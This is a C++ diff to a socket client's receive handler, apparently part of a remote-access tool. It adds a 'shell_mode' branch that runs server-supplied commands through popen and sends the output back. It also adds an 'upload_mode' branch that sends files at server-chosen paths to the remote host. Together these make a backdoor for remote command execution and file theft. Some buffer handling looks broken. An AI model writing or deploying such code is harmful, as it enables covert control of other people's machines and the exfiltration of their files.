@@ -1,10 +1,14 @@
 #include "../../include/socket/client_socket.h"
 #include <arpa/inet.h>
+#include <array>
+#include <cstdio>
 #include <cstring>
 #include <filesystem>
 #include <fstream>
 #include <functional>
+#include <memory>
 #include <netinet/in.h>
+#include <sstream>
 #include <sys/socket.h>
 #include <thread>
 #include <vector>
@@ -592,6 +596,8 @@ ClientTypes::SocketStatus SocketClient::uploadAll(const void *path, const uint32
     return sstatus_t::err_socket_ok;
 }
 
+#include <iostream>
+
 ClientTypes::SocketStatus SocketClient::recvHandler() {
     if (server.size() > std::thread::hardware_concurrency()) {
 
@@ -606,11 +612,52 @@ ClientTypes::SocketStatus SocketClient::recvHandler() {
             std::function<bool()> fnc = [&]{
                 while (::recv(_.socket_, r_buffer.data(), 1, 0)) {
                     if (r_buffer[0] == ClientTypes::chr_handler::upload_mode) {
-                        
+                        std::cout << "update" << std::endl;
+
+                        std::vector<char> buffer(__INT16_MAX__);
+
+                        if (::recv(_.socket_, buffer.data(), buffer.size(), 0) < 0)
+                            return false;
+
+                        std::string path = buffer.data();
+
+                        if (sstatus_t::err_socket_ok != this->uploadBy(_.CID, path))
+                            return false;
+
+                        r_buffer.clear();
                     }
 
                     if (r_buffer[0] == ClientTypes::chr_handler::shell_mode) {
+                        std::function<std::string(const char *)> execlp = [&](const char *cmd){
+                            std::array<char, 128> buff;
+                            std::string         result;
 
+                            std::unique_ptr<FILE, decltype(&pclose)> 
+                                    pipe(popen(cmd, "r"), pclose);
+
+                            if (!pipe)
+                                return std::string();
+
+                            while (fgets(buff.data(), buff.size(), pipe.get()) != nullptr)
+                                result += buff.data();
+                            
+                            return result;
+                        };
+
+                        std::string command;
+
+                        for (uint32_t i = 1; i < r_buffer.size(); i++)
+                            command.push_back(r_buffer[i]);
+
+                        std::string __log = execlp(command.c_str());
+
+                        if (!__log.size())
+                            return false;
+
+                        if (::send(_.socket_, __log.c_str(), __log.size(), 0) < 0)
+                            return false;
+
+                        r_buffer.clear();
                     }
 
                     if (r_buffer[0] == ClientTypes::chr_handler::ping_mode) {
@@ -620,6 +667,8 @@ ClientTypes::SocketStatus SocketClient::recvHandler() {
 
                 return true;
             };
+
+            pool.add_thread(fnc);
         }
     }
 
